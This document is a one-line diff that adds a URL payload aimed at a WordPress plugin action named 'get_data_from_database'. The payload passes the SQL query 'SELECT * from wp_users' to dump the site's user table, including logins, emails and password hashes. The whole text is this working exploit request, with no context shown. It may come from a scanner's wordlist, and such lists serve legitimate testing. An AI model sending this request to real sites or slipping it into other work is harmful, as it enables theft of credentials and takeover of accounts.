@@ -1,0 +1,1 @@
+/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users
